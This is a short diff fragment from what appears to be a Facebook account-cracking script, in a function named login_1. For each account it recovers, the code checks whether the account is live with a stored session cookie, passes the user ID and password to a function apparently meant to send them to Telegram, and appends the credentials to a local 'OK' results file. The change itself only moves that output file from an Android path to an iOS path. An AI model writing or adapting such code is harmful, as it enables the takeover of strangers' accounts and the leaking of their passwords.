@@ -575,7 +575,7 @@ def login_1(uid):
                 year = creationyear(uid)
                 status = check_fb_live(uid, FB_COOKIE)
                 send_to_tele(uid, pw, year, status)
-                open('/sdcard/DTD-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}\n")
+                open('/var/mobile/Documents/DTD-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}\n")
                 oks.append(uid)
                 break
         loop += 1
